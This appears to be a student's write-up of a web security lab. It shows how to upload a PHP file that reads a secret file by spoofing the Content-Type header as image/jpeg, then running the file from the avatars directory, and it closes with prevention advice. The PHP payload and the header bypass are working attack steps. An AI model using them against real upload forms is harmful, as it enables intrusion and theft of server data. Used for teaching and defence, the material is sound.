# 🧾 Web Shell Upload — Content-Type Restriction Bypass

## 🎯 Objective
- Exploit weak MIME-type validation during file upload to:
  - Bypass client/server-side upload restrictions
  - Upload executable PHP web shell
  - Achieve remote code execution
  - Retrieve protected server-side secrets

---

## ❗ Why This Matters

- Relying solely on Content-Type validation:
  - Is trivially bypassable
  - Trusts user-controlled metadata
- Leads to:
  - Arbitrary file upload
  - RCE
  - Full application compromise

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Baseline Avatar Functionality

## 1️⃣ Legitimate Upload Test

### Action:

- Log in
- Upload normal avatar image

---

### Observation:

- ✔️ File stored in:

  ```http 
  /files/avatars/<uploaded-file>
  ```

---

### Security Insight:

```text 
Uploaded files are web-accessible
```

---

# 🚀 Part 2 — Prepare Malicious PHP Payload

## 2️⃣ Payload File

### Filename:

```php 
exploit.php
```

---

### Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Purpose:

- ✔️ Read Carlos’s secret file
- ✔️ Output directly

---

# 🚀 Part 3 — Initial Upload Attempt

## 3️⃣ Direct Upload

### Result:

- ❌ Rejected

---

### Error:

```text 
Only image/jpeg or image/png allowed
```

---

## ⚠️ Vulnerability Insight

```text 
Validation relies on user-controlled MIME type rather than true file inspection
```

---

# 🚀 Part 4 — Burp Repeater Manipulation

## 4️⃣ Intercept Upload Request

### Endpoint:

```http
POST /my-account/avatar
```

---

### Modification:

- Change:

  ```http 
  Content-Type: application/x-php
  ```

### To:

```http
Content-Type: image/jpeg
```

---

### Result:

- ✔️ Upload accepted

---

# 🚀 Part 5 — Trigger Web Shell

## 5️⃣ Access Uploaded PHP File

```http
GET /files/avatars/exploit.php
```

---

### Outcome:

- ✔️ PHP executed
- ✔️ Carlos’s secret returned
- ✔️ Remote code execution achieved
- ✔️ Lab solved 🎉

---

## 🏁 Lab Completion

* Weak MIME validation identified
* Content-Type header manipulated
* PHP web shell uploaded
* RCE achieved
* Sensitive file disclosed

---

## 🧠 Key Takeaways

* Content-Type is attacker-controlled
* MIME validation alone is insufficient
* Extension + server execution rules matter
* Upload directories should never execute scripts
* Proper content inspection is essential

---

## 🔥 Core Vulnerability

```text 
User-controlled Content-Type validation allowed unrestricted executable PHP upload
```

---

## 🛡️ Prevention

* Validate:

  * File signatures (magic bytes)
  * Extensions
  * MIME types
* Rename:

  * Uploaded files
* Store:

  * Outside web root
* Disable:

  * Script execution
* Scan:

  * Uploaded content

---

## ⚠️ Security Principle

```text 
If security trusts metadata supplied by attackers, validation is meaningless
```

---

## 🏁 Status

- ✔️ Lab Completed
